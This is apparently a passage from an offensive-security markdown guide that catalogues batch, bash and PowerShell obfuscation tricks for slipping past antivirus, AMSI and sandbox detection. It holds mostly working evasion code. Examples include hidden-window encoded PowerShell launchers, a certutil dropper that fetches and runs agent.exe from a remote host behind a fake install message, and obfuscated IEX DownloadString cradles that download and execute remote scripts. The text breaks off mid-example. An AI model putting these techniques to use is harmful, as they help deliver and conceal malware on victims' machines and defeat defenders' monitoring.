![banner](http://i68.tinypic.com/2d1ux00.jpg)


                                                  - INTRO -

      I have found out that many A/V vendors and other detection frameworks and services were writing
      signatures for specific PowerShell attacks based solely on PowerShell execution arguments like:

      -exec bypass -win Hidden -noni -enc | -ep bypass -noni -w hidden -enc | .WebClient).DonwloadString

      That and the amazing work conducted by @danielbohannon in Invoke-Obfuscation, it took me to compile
      this article with a list of available obfuscation technics for cmd.exe (cmd-bat) bash (bash-sh) and
      powershell (psh-ps1), in one attempt to bypass AV's AMSI and DEP detection mechanisms and sandbox
      evasion technics. This article does not focus in shellcode obfuscation or crypting, but only in
      system call's that are (or migth) beeing detected by security suites like microsoft's AMSI ..

<br />

**Diagram of PowerShell execution arguments beeing flagged by AMSI security suites**<br />
![detection pic](http://i65.tinypic.com/2jz3as.jpg)<br />

**Example of one obfuscated powershell dropper** [ psh-dropper.ps1 ]<br />
![powershell obfuscation](http://i66.tinypic.com/t9bdaq.jpg)<br />

**Example of one obfuscated batch agent** [ AgentK.bat - venom-framework ]<br />
![batch obfuscation](http://i66.tinypic.com/30krpy0.jpg)<br />

**Example of one obfuscated vbs agent** [ Agent.vbs ]<br />
![vbscript obfuscation](http://i.cubeupload.com/7oPCYh.png)<br />

<br />

                                               - SPECIAL NOTE -

      remember that if we chose to use the 'batch' obfuscation technic, then it will only work in MS-DOS
      interpreter (cmd.exe or file.bat), If we use one 'batch' special character in powershell terminal
      console, then the powershell interpreter will not be able to escape the special character.

      Its also a good practice to test your obfuscation sourcecode in 'target' terminal console to check
      if the code its not broken with a missplaced special character or other diferent thing interfering
      with sourcecode normal execution, before sending your obfuscated code to target machine ..

      To conduct this kind of tests (In powershell) we need to allow the execution of powershell scripts.
                 1º - Start Windows PowerShell with the "Run as Administrator" option.
                 2º - Execute the follow in terminal: set-executionpolicy remotesigned
                 3º - To revert group policy to default: set-executionpolicy restricted


**Bad character sellection** [ batch escape character -used- in powershell interpreter ]
![bad character sellection](http://i64.tinypic.com/2u7c5kz.jpg)

**Good character sellection** [ powershell special character used in powershell interpreter ]
![powershell obfuscation](http://i64.tinypic.com/2u7c50n.jpg)

---

<br /><br /><br />

## Glosario (Index):
[0] <- Yes, just because in computing 0 its an importante number too :P<br />
[1] [Batch Obfuscation Technics (cmd-bat)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#batch-obfuscation-cmd-bat)<br />
[2] [Bash Obfuscation Technics (bash-sh)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bash-obfuscation-bash-sh)<br />
[3] [Powershell Obfuscation Technics (psh-ps1)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#powershell-obfuscation-psh-ps1)<br />
[4] [VBScript Obfuscation Technics (vba-vbs)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#vbscript-obfuscation-technics-vba-vbs)<br />
[5] [C Obfuscation Technics (c-exe)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-obfuscation-technics-c-exe)<br />
[6] [AMSI Bypass Technics (COM/REG)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#amsi-comreg-bypass)<br />
[7] [Bypass the scan engine (sandbox)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bypass-the-scan-engine-sandbox)<br />
[8] [Obfuscating msfvenom template (psh-cmd)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#obfuscating-the-metasploit-template-psh-cmd)<br />
[9] [C to ANCII Obfuscated shellcode (c-ancii)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-to-ancii-obfuscation-c-ancii)<br />
[10] [FInal Notes - Remarks - POC's](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#final-notes---remarks)<br />
[11] [Special Thanks - Referencies](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#special-thanks)<br />


<br /><br /><br /><br /><br />

## Batch Obfuscation (cmd-bat)

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **batch special character: ^** <br />

- String obfuscated<br />

      cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode

![batch obfuscation](http://i68.tinypic.com/qx3xc6.jpg)

---

- String command to obfuscate<br />
`cmd.exe /c powershell.exe Get-WmiObject -Class win32_ComputerSystem`<br />
The above string can be obfuscated using the **batch special character: "** <br />

- String obfuscated<br />

      c"m"d.ex"e" /c pow"e"r"s"hell"."e"x"e G"e"t"-"Wmi"O"bje"c"t -Cl"a"ss win32_ComputerSystem

![batch obfuscation](http://i65.tinypic.com/2wbrzh0.jpg)
`HINT: In tests conducted i was not been able to use 2 letters inside double quotes (eg. c"md".exe)`

---

- Any formula under the **batch interpreter** can be started with the follow special characters: **@** or **=** or **,** or **;**

      =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      @cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      ,cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      ;cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode


      cmd.exe /c @powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      cmd.exe /c =powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode


      [Using 3 diferent technics (=@|^|")]
      @c^m"d".ex^e /c ,p"o"wer^s^hell"."ex^e G"e"t"-"Wm^i"O"bje"c"t -Cl"a"s^s win32_ComputerSystem

![batch obfuscation](http://i66.tinypic.com/2ag6b6g.jpg)

---

      Further obfuscation adding ramdom whitespaces + commas + semi-collons + carets + double quotes
      HINT: Empty space technic can't be used to brake the command argument, but used between them.

<br />

- String command to obfuscate<br />
`cmd.exe /c start /max netstat -ano | findstr LISTENING`

<br />

- String obfuscated [whitespaces]<br />
![batch obfuscation](http://i.cubeupload.com/eyGNUO.jpg)

- String obfuscated [whitespaces+collon+semi-collon]<br />
`cmd.exe /c ,;,  start ;,,  /max ;,,  netstat -ano |; findstr  ,;LISTENING`<br />

- String obfuscated [whitespaces+collon+semi-collon+caret]<br />
`c^md.e^xe /^c ,;,  st^ar^t ,/mA^x ;^,,  n^et^sta^t -a^no |; fi^nds^tr  ,;LI^ST^ENING`<br />

- String obfuscated [whitespaces+collon+semi-collon+caret+quotes]<br />
`;c^M"d".e^Xe ,/^c ,;,  ,sT^aR^t ,/mA^x "";^,,  n^Et^s"T"a^t  -a^"n"O |;, ,fI^n"d"S^tr  ,;L"I"^ST^EN"I"NG`<br />

![batch obfuscation](http://i.cubeupload.com/zneLJv.jpg)

---

      Using the alternative cmd.exe [ /R ] switch to execute commands

![batch obfuscation](http://i.cubeupload.com/dQkpXr.jpg)<br />

<br />

- String command to obfuscate<br />
`cmd.exe /c start calc.exe`<br />

- String obfuscated<br />
`cmd.exe /R start calc.exe`<br />

![batch obfuscation](http://i.cubeupload.com/9cwoS1.jpg)

---

      @Daniel bohannon reported days ago another cmd ofuscation technic that relays
      on a string added in betuinw switch flags [ /R = lablabla/R ] ..

<br />

- String command to obfuscate<br />
`cmd.exe /R start calc.exe`<br />

- String obfuscated<br />
`cmd.exe rubishdata/R start calc.exe`<br />

![batch obfuscation](http://i)

---

- cmd arguments trigger chars [ - or / ]

      since we are using the cmd interpreter to lunch powershell, we can replace
      the powershell trigger arguments characters '-' by cmd interpreter: '/'

<br />

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -wind hidden Get-WmiObject -Class Win32_ComputerSystem`

- String obfuscated<br />
`cmd.exe /c powershell.exe /wInd 3 Get-WmiObject -Class Win32_ComputerSystem`<br />

![batch obfuscation](http://i.cubeupload.com/MngcC1.jpg)

---

- We can also **pipe** commands to avoid detection, adding rubish data into the beggining of the funtion

      echo "rubish data" | cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

![pipe commands](http://i66.tinypic.com/2lcbseo.jpg)

      HINT: using [ || ] allow us to execute the 2º command if the 1º one fails to execute
      COPY %windir%\notepad.exe %nonexisting%\fake.exe || cmd.exe /c start calc

![pipe commands](http://i.cubeupload.com/EIQWfa.jpg)

---

      Using a batch redirection caret (<nul) to add a extra layer of rubish data into our oneliner.
      HINT: the <nul caret will be replaced by a empty string at execution time, And If used the special
      character ^ at the end of the <nul caret them the token written next to it will also be replaced
      by a empty string, Example: cmd.exe /c start calc <nul ^DataToDelete

<br />


- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`

- String obfuscated (**<nul**) special character.<br />
`cmd.exe /c <nul powershell.exe <nul -nop -wind hidden -Exec Bypass -noni -enc $shellcode`

![batch obfuscation](http://i64.tinypic.com/2moo0om.jpg)

---

      [ Brake command line arguments into diferent vars ]
      The batch command 'CALL' executes one batch file from within another. If you execute a
      batch file from inside another batch file without using CALL, the original batch file
      is terminated before the other one starts. CALL command can also be used to 'call'
      the previous defined variables and joint them together in a new environment variable. 
      

<br />


- String command to obfuscate<br />
`cmd.exe /c netstat -s -p TCP`

- String obfuscated [brake command line arguments into diferent vars]<br />

      cmd.exe /c "set com3= /s /p TCP&&set com2=stat&&set com1=net&&call set join=%com1%%com2%%com3%&&call %join%"

![batch obfuscation](http://i.cubeupload.com/LtFMqK.jpg)

      Another diferent way to brake the command into diferent variables, join them together, and exec

- String obfuscated [brake command line arguments into diferent vars]<br />
`cmd.exe /c "set com1=net&&set com2=stat&&set join=%com1%%com2%&&echo %join% | cmd"`

![batch obfuscation](http://i.cubeupload.com/vzzmTR.jpg)

      HINT: we can separate the command arguments also, example: cmd.exe /c [var][var] -s [var] TCP
      This way we can separate the command from its arguments or even input a new argument in the middle.

- String obfuscated [brake command line arguments into diferent vars]<br />

      cmd.exe /c "set com1=net&&set com2=stat&&set com3=-p&&set join=%com1%%com2% -s %com3% TCP&&echo %join%|cmd"

![batch obfuscation](http://i.cubeupload.com/A4j8mi.jpg)

      we can also use the "enabling delayed environment variable expansion" [/V:ON]
      command to be able to call your variales in two diferent ways: %var% OR !var!

- String obfuscated [another example using cmd /c to exec the string]<br />
`cmd.exe /c "set buff=net&& set void=at&&set char=st&&" cmd /V:ON /c %buff%!char!%void% -s -p UDP`

![batch obfuscation](http://i.cubeupload.com/Y2KNXr.jpg)

      cmd.exe variable declarations also accepts special characters

- String obfuscated [special characters inside set declarations]<br />
`cmd.exe /c "set --$#$--=net&& set '''=at&&set ;;;;=st&&" cmd /c %--$#$--%%;;;;%%'''% -s -p UDP`

![batch obfuscation](http://i.cubeupload.com/v5FqKw.jpg)

---

      Obfuscating windows batch files using undefined environmental variables.
      '''Inside .bat files''' undefined environmental variables are expanded into empty strings
      Since cmd.exe allows using variables inside commands, this can be used for obfuscation.

      Choose some set of environmental variables that you are certain are not defined
      on most of the machines Example: single or two letter variables like %A%, %0B%, %C% ..

<br />

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -Exec Bypass -noni -enc $shellcode`<br />

- String obfuscated (**undefined-vars.bat**)<br />

      @echo off
      %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
      exit

![batch obfuscation](http://i65.tinypic.com/16j287c.jpg)<br />
`HINT: Undefined variables technic are only accessible in bat scripting (it will not work in terminal)`

---

      We can also use batch local enviroment variables to scramble the syscall's
      Since cmd.exe allows using variables inside commands, this can be used for obfuscation.
      HINT: chose letters as: 'a e i o u' because they are the most commom ;)
      HINT: dont leave 'empty spaces' defining variables (set i#=t<empty-space>)

<br />

- String command to obfuscate<br />
`netstat -s | findstr Opens`<br />

- String obfuscated (**test.bat**)<br />

      @echo off
      set i#=t
      set pP0=p
      set db0=a
      set !h=n

      %!h%e%i#%st%db0%%i#% -"s" | fi%!h%ds%i#%r O%pP0%e%!h%s

![batch obfuscation](http://i64.tinypic.com/33lmik5.jpg)

---

      This next technic uses one batch local variable (%varObj%) as MasterKey that allow us to extract
      the strings inside the %varoBj% variable to build our command. [special thanks: @Wandoelmo Silva]

<br />

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />

- String obfuscated (**template.bat**)<br />

      @echo off
      SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
      %varObj:~2,1%%varObj:~11,1%%varObj:~3,1%.exe /c %varObj:~14,1%%varObj:~13,1%%varObj:~25,1%%varObj:~4,1%%varObj:~16,1%%varObj:~17,1%%varObj:~7,1%%varObj:~6,1%%varObj:~10,1%%varObj:~10,1%.exe -nop -%varObj:~25,1%%varObj:~8,1%%varObj:~3,1%%varObj:~3,1%%varObj:~4,1%%varObj:~12,1% -%varObj:~40,1%%varObj:~21,1%%varObj:~4,1%%varObj:~2,1% %varObj:~37,1%%varObj:~24,1%%varObj:~14,1%%varObj:~0,1%%varObj:~17,1%%varObj:~17,1% -noni -%varObj:~4,1%%varObj:~12,1%%varObj:~2,1% $shellcode
      exit

![batch obfuscation](http://i67.tinypic.com/2zdu9z7.jpg)

[!] [Description of %varObj% MasterKey (importante reading to understand the mechanism)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md)<br />

---

      [ certutil - Additional Methods for Remote Download ]
      Sometimes we need to use non-conventional methods to deliver our agent to target
      system and bypass detection, in this situation certutil can be an useful asset.

<br />

- String command to obfuscate<br />
`cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.71/agent.exe agent.exe && start agent.exe`<br />

- File **certutil-dropper.bat** to be executed in target system

      @echo off
      sEt !h=e
      sEt db=c
      sEt 0x=a
      echo [+] Please Wait, Installing software ..
      ;%db%M%A0%d"."eX%!h% /%db% @%db%e"r"Tu%A1%tIl.%!h%^xe "-"u^R%A0%l%db%Ac^h%!h% "-"sP%A0%l^i%A8%T -f ht%A0%tp://19%d0%2.1%A0%68.1.71/agent.exe agent.exe && start agent.exe
      exit

![batch obfuscation certutil.bat](http://i68.tinypic.com/jsfuq1.jpg)
`HINT: If you desire to send an .bat payload then delete 'start' from the sourcecode`<br />

---

      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
      the agent.bat dosen't contain any real malicious syscall's to be scan/flagged.

      HINT: Since windows dosen't have a base64 term interpreter built in installed,
      we have two choises to decode the base64 encoded syscall, or use the built in
      powershell (::FromBase64String) switch to decode our syscall or we chose to use
      certutil, but certuil onlly accepts strings taken from inside a text file, in
      that situation we instruct our script to writte the text files containing the
      obfuscated syscall's before further head using certutil to decode them.

      REMARK: If the local var can't be accessed from cmd, setX syscall=R2V0LURhdGUK

<br />

- String command to obfuscate<br />
`Get-Date`

- using base64 to decode the encoded syscall

      1º - encode the command you want to obfuscate (linux-terminal)
      echo "Get-Date" | base64

      2º - copy the encoded string to paste it on your script
      R2V0LURhdGUK

      3º - Insert the follow lines into your batch script

        @echo off
        set syscall=R2V0LURhdGUK :: <-- WARNING: Dont leave any 'empty spaces' in variable creation
        powershell.exe $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:syscall)); powershell.exe $decoded ::<-- execute/decode the base64 syscall at runtime

![batch obfuscation](http://i66.tinypic.com/qzfbex.jpg)

---

- More obscure obfuscated/bypass technics<br />

      [ cmd similar interpreter's ] defenders watching launches of cmd instance?
      then use the follow Microsoft signed binarys to execute your agents

      bash.exe -C calc.exe
      scriptrunner.exe -appvscript calc.exe
      forfiles /p c:\windows\system32\ /m notepad.exe /c calc.exe

![batch obfuscation](http://i.cubeupload.com/i60JVh.jpg)

<br />

      [ delimiter removal in cmd interpreter :@= ] 
      we can use [ @ ] special char to obfuscate the syscall and then remove it at execution time..

      The attacker sets the netstat command in a process-level environment variable called x before
      passing it to the final cmd.exe as standard input. The attacker also obfuscates the string netstat
      in the original cmd.exe command using @ characters. The @ characters are later removed from the
      command contents stored in the environment variable x using cmd.exe’s native variable string
      replacement functionality. %VariableName:StringToFind=NewString% where StringToFind is the @
      character and NewString is blank, so the @ character is simply removed.

<br />

- String command to obfuscate<br />
`cmd.exe /c netstat`

- String obfuscated<br />
`cmd.exe /c "set x=net@st@at&&echo %x:@=% | cmd"`

![pipe commands](http://i.cubeupload.com/FE0TA8.jpg)

      This technic can also be used to replace the [ @ ] special character in local environment
      variable by the char missing on it ( in this example the char missing in command is: [ t ] )

- String obfuscated<br />
`cmd.exe /c "set x=ne@s@a@&&echo %x:@=t% | cmd"`

![pipe commands](http://i.cubeupload.com/8ySlqV.jpg)

      Remove the first and the last character of a string

- String obfuscated<br />
``cmd.exe /c "set x=inetstatu&&set str=%x:~1,-1%&&echo %str% | cmd"``

![pipe commands](http://i.cubeupload.com/y1kA6G.jpg)

      Returning a specified number of characters from the left side of a string

- String obfuscated<br />
`cmd.exe /c "set x=netstatrubish&&set str=%x:~0,7%&&echo %str% | cmd"`

![pipe commands](http://i.cubeupload.com/McTrjq.jpg)

      Using the delimiter remove technic into one cradle downloader (powershell or batch)

- String command to obfuscate<br />
`cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/hello.ps1')`

- String obfuscated<br />

      cmd.exe /c "set x=po@wer@sh@ell.ex@e I@E@X (N@ew-O@bje@ct @Ne@t.@WebC@lie@nt).Do@wnl@oad@St@ri@ng('ht'+'@tp:'+'//@1'+'92@.1'+'6@8.'+'1.71/he@ll@o.ps@1')&&echo %x:@=% | cmd"

![pipe commands](http://i.cubeupload.com/tv0oWc.jpg)

- More obfuscated using carets special batch characters<br />

![pipe commands](http://i.cubeupload.com/EhLChy.jpg)

---

      [ Parentheses obfuscation ] Evenly-paired parentheses can encapsulate individual commands
      in cmd.exe’s arguments without affecting the execution of each command. These unnecessary
      parenthesis characters indicate the implied sub-command grouping interpreted by cmd.exe’s
      argument processor. Paired parentheses can be liberally applied for obfuscation purposes.

<br />

- String command to obfuscate<br />
`cmd.exe /c whoami && netstat`

- String obfuscated [double Parentheses]<br />
`cmd.exe /c ((whoami)) && ((netstat))`<br />

![batch obfuscation](http://i.cubeupload.com/72IYdJ.jpg)

- string more obfuscated using: Parentheses+carets+double_quotes+collon+semi-collon<br />

![batch obfuscation](http://i.cubeupload.com/oooagr.jpg)

      The batch command 'call' executes one batch file from within another. If you execute a
      batch file from inside another batch file without using CALL, the original batch file
      is terminated before the other one starts. This method of invoking a batch file from
      another is usually referred to as chaining and allows us to set any environement
      variable and 'call it' later in sourcecode ..

![batch obfuscation](http://i.cubeupload.com/80N23a.jpg)

---

      [ obfuscating the string powershell ]
      If the proccess name is 'powershell' and the command line arguments match some specific
      patterns, AMSI/AV's will flag that input as malicious. One way to obfuscate the string
      PowerShell in the example command is to substitute individual characters with substrings
      of existing environment variable values.

      The Path variable value may vary across different systems depending on various installed
      programs and configurations, but the PSModulePath variable will likely have the same value
      on any given system. Case-sensitive substring values such as PSM, SMo, Modu, etc. can be
      used interchangeably to return only the PSModulePath variable.

<br />

- String command to obfuscate<br />
`powershell Get-Date`

- String obfuscated using cmd FOR loop<br />
`FOR /F "delims=s\ tokens=4" %a IN ('set^|findstr PSM')DO %a Get-Date`

![batch obfuscation](http://i.cubeupload.com/VD3klE.jpg)<br />

![batch obfuscation](http://i.cubeupload.com/PHEyYA.png)<br />

- Another example of cmd FOR loop technic<br />

![batch obfuscation](http://i.cubeupload.com/RfM32P.jpg)<br />

- Another example of cmd [ FOR loop + /V:ON + CALL ] technics<br />

      cmd.exe /V:ON /C "set unique=netsa&&FOR %A IN (0 1 2 3 2 4 2 1337) DO set final=!final!!unique:~%A,1!&& IF %A==1337 CALL %final:~-7%"

![batch obfuscation](http://i.cubeupload.com/C8AzE8.png)<br />

- More obfuscated using [ @ = , ; ^ + ( ) ] special characters<br />

![batch obfuscation](http://i.cubeupload.com/a0F8iS.png)<br />


      WARNING: Remmenber that this screenshots are examples to exec in terminal, so if your plans
      are to use the FOR loop technic then remmenber to input a double number of % in var declarations.

![batch obfuscation](http://i.cubeupload.com/ypR2sm.png)<br />

      Another technic its to copy powershell.exe from %windir% to %tmp% folder (rewritable location)
      and rename it to another name with a diferent extension and call it to execute powershell args.

![batch obfuscation](http://i.cubeupload.com/fwGdya.jpg)<br />

      Another LOLbin transformation that may help bypass applocker restrictions ..

![batch obfuscation](http://i.cubeupload.com/sfzsuo.png)<br />

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />

---

<br /><br /><br /><br />

## Bash Obfuscation (bash-sh)

- String command to obfuscate<br />
`whoami`<br />
The above string can be obfuscated using **bash special characters: '** or **\\** or **$@**<br />

- String obfuscated<br />

      w'h'o'am'i <-- This technic requires to 'open' and 'close' the single quotes

      w"h"oa"m"i <-- This technic requires to 'open' and 'close' the double quotes

      w\h\o\am\i

      w$@h$@o$@am$@i

      w$@h\o$@a"m"'i' <-- Using the 4 previous methods together 

![3 special characters](http://i68.tinypic.com/2yphdvs.png)

---

- We can also **pipe** commands to avoid detection with **|** or **;** or **&&**

      echo "Rubish data" | w$@h$@o\am$@i

      echo $@I A\M; who\am$@i

      echo $@I A\M; wh$@oam$@i && echo o\ff$@cou$@rs\e .\.

![pipe bash obfuscation](http://i64.tinypic.com/2eg8io9.png)

---

      Using rev <<< to reverse the order of the characters in a string.
      Using this technic allow us to writte the syscall's backwards and
      decode/revert them at run-time execution (auto-exec: |$0 = /bin/bash).

<br />

- String command to obfuscate<br />
`lsblk -m`<br />

- String obfuscated <br />
`rev <<< 'm- klbsl' |$0`

![bash rev obfuscation](http://i68.tinypic.com/23vj9yw.png)

- String command to obfuscate<br />
`whoami`<br />

- String obfuscated <br />
`rev <<< i$@ma\o$@hw |$0`

![bash rev obfuscation](http://i64.tinypic.com/2u9sj91.png)
`HINT: Single quotes are not allowed in Combining rev <<< and the batch \ escape character`

---

      This next technic uses one bash local variable ($M) as MasterKey that allow us to extract
      strings inside the $M variable to build our command and sends it to a file named meme.
      [special thanks to: @Muhammad Samaak]

<br />

- String command to obfuscate<br />
`route`<br />

- String obfuscated (**oneliner**)<br />

      M="ureto" && echo ${M:1:1}${M:4:1}${M:0:1}${M:3:1}${M:2:1} > meme; ul meme;
      [ print parsed data on screen (route syscall pulled from inside $M variable) ]

![bash obfuscation](http://i64.tinypic.com/wbfl9w.jpg)

      M="ureto" && echo ${M:1:1}${M:4:1}${M:0:1}${M:3:1}${M:2:1} |$0
      [ parsing data inside $M variable to extract and 'execute' the string: route ]

![bash obfuscation](http://i64.tinypic.com/5k1qb7.jpg)
`HINT: The var ${M:0:1} extracts the letter U from inside the $M local var to build: route`

---

      This next technic uses $s bash local variable to extract the letters from the variable $skid then
      uses a loop funtion (for i in) to take the arrays and convert them into a string, them the pipe | tr -d
      command will delete the empty lines from the string and passes the output (pipe) to 'do echo ${skid[$i]}'
      funtion that prints the results (full string) on screen, the 'done' funtion will close the 'for i in' loop.
      [special thanks to: @Muhammad Samaak]

<br />

- String command to obfuscate<br />
`whoami`<br />

- String obfuscated (**oneliner**)<br />

      skid=(i h w o a m r w X);s=(2 1 3 4 5 0);for i in ${s[@]};do echo ${skid[$i]} | tr -d '\n';done
      [ parsing data inside $skid and $s variables to extract the string: whoami ]

![bash obfuscation](http://i67.tinypic.com/2e0lgqr.png)

      skid=(i h w o a m r w X);s=(2 1 3 4 5 0);for i in ${s[@]};do echo ${skid[$i]} | tr -d '\n';done |$0
      [ parsing data inside $skid and $s variables to 'extract' and 'execute' the string: whoami ]

![bash obfuscation](http://i68.tinypic.com/e6t0tw.png)

`HINT: The number 0 inside variable $s conrresponds to the letter possition in var $skid (i)`

---

      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
      the agent.sh dosen't contain any real malicious syscall's to be scan/flagged. 

<br />

- String command to obfuscate<br />
`route -n`

- Using base64 to decode the encoded syscall (test.sh)

      1º - encode the command you want to obfuscate (linux-terminal)
      echo "route -n" | base64

      2º - copy the encoded string to paste it on your script
      cm91dGUgLW4K

      3º - Insert the follow lines into your bash script

        #!/bin/sh
        string=`echo "cm91dGUgLW4K" | base64 -d`
        $string   #<-- execute/decode the base64 syscall at runtime

![bash obfuscation](http://i63.tinypic.com/4kwker.jpg)

---

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />

---

<br /><br /><br /><br />

## Powershell Obfuscation (psh-ps1)

- String command to obfuscate<br />
`powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **powershell special character: `**<br />

- String obfuscated<br />

      po`wer`shel`l.ex`e -n`op -w`in`d h`idd`en -E`xe`c B`yp`ass -n`on`i -en`c $shellcode

![powershell obfuscation](http://i63.tinypic.com/2nvt7wz.jpg)

---

- Using one **batch** local variable inside the **powershell interpreter**

      cmd.exe /c "set var=Get-Date&& cmd.exe /c echo %var%^" | powershell.exe

      [ "powershell" can be also set and called as variable in cmd.exe ]
      cmd.exe /c "set p1=power&& set p2=shell&& cmd /c echo Write-Host SUCCESS ^| %p1%%p2%.exe"

![powershell obfuscation](http://i65.tinypic.com/2liea90.jpg)

- More Obfuscated using powershell **`** and batch **^** special characters

      c`md`.e`xe /c "s^Et va^r=Get-Date&& c^md^.e^xe /c e^ch^o %var%^" | power`shell.`ex`e

![powershell obfuscation](http://i67.tinypic.com/3509rw5.jpg)

---

      We can obfuscate the syscall's by simple split them into local variables and concaternate
      them using 'tick' + 'splatting' obfuscation methods inside variable declarations.

<br />

- String command to obfuscate<br />
`powershell.exe Get-WmiObject -Class Win32_ComputerSystem`<br />
The above string can be obfuscated using **powershell special characters:** **`** and **+** and **$var** and **'**<br />

- String obfuscated<br />

      $get = "G`et-Wm`iObj`ect"                     #<-- caret ` inside double quotes
      $sys = 'Wi'+'n32_C'+'ompu'+'terS'+'ystem'     #<-- caret + inside single quotes
      p`ow`ers`hell.e`xe $get -Class $sys           #<-- de-obfuscate syscall's at run-time

![powershell obfuscation](http://i63.tinypic.com/71pe0h.jpg)

---

      [ obfuscating .DownloadString ] In this article we allready have learned how to
      use variable declarations + tick special characters to obfuscate the systemcall's.

      $method = "D`ow`nlo`adSt`rin`g"
      IEX (New-Object Net.WebClient).$method('http://192.168.1.71/hello.ps1')

      This next example shows how to use 'parentheses' to transform the DownloadString flag
      into one powershell string that can be manipulated using more obfuscated technics ..

- String command to obfuscate<br />
`IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/hello.ps1')`

- String obfuscated [Parentheses+tick]<br />

      I`EX ((N`ew-Obj`ect N`et.We`bCli`ent)).('Do'+'wn'+'lo'+'adStr'+'ing').Invoke(('h'+'tt'+'p:/'+'/19'+'2.16'+'8.1.71/hello.ps1'))

![batch obfuscation](http://i.cubeupload.com/0CXBYp.jpg)

---
      Powershell also allow us to access windows environment variables using the $env: switch
      Using $env:LOCALAPPDATA (windows environment variable) and -Join '' to pull out the 0º ,23º, 21º,7º and 7º
      chars from $env:LOCALAPPDATA and then the -Join '' operator will take the array and convert it to a string.

<br />

- String command to obfuscate<br />
`powershell.exe Get-WmiObject -Class Win32_ComputerSystem`

- String obfuscated<br />

      $call = $env:LOCALAPPDATA[0,23,21,7,7]-Join ''
      powershell.exe Get-WmiObject -$call Win32_ComputerSystem

![powershell obfuscation](http://i66.tinypic.com/334kh9w.jpg)

---

      [ .Split powershell method ]
      Build a variable named $encoded with the 'SPLIT' syscall inside, and use $encoded.Split("~~") -Join ''
      to 'de-split' the syscall into a new local variable named $decoded, to be called at run-time.

<br />

- String command to obfuscate<br />
`Get-WmiObject -Class Win32_ComputerSystem`

- String obfuscated<br />

      $encoded = "Get-W~~miO~~bject -C~~la~~ss Wi~~n32_Co~~mput~~erSystem"
      $decoded = $encoded.Split("~~") -Join ''
      poweshell.exe $decoded 

![powershell obfuscation](http://i66.tinypic.com/2v2k2lt.jpg)

---

      [ -Replace powershell method ]
      Build a variable named $encoded with the 'SPLIT' syscall inside, and use $encoded.Replace("~~","")
      to 'de-split' the syscall into a new local variable named $decoded, to be called at run-time.

<br />

- String command to obfuscate<br />
`(New-Object Net.WebClient).DownloadString('http://192.168.1.71/Hello.ps1')`

- String obfuscated<br />

      $encoded= "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/Hello.ps1')"
      $decoded = $encoded.Replace("~~","")
      IEX $decoded

      [ OR -Replace which is case-sensitive replace ]
      $decoded = $encoded-Replace "~~","")
      IEX $decoded

![powershell obfuscation](http://i63.tinypic.com/10wi1b8.jpg)

<br />

      Another way to use the -Replace switch (remmenber that we can store this command into a $var)

<br />

- String command to obfuscate<br />
`Get-Date`

- String obfuscated<br />
`(('0 2 4 1 3'-Replace'\w+','{${0}}'-Replace' ','')-f'Get','t','-D','e','a')`

![powershell obfuscation](http://i.cubeupload.com/tg6EXi.jpg)

---

      [ ScriptBlock -Replace method ]
      Build a variable named $ScriptBlock with the 'SPLIT' syscall inside, and use .Replace("+","")
      to 'de-split' the syscall into a new local variable named $syscall, to be called at run-time.

<br />

- String command to obfuscate<br />
`Win32_OperatingSystem`

- String obfuscated<br />

      $ScriptBlock = "Wi'+'n?32_O'+'p%era'+'ti%n%gS'+'y?st%em"
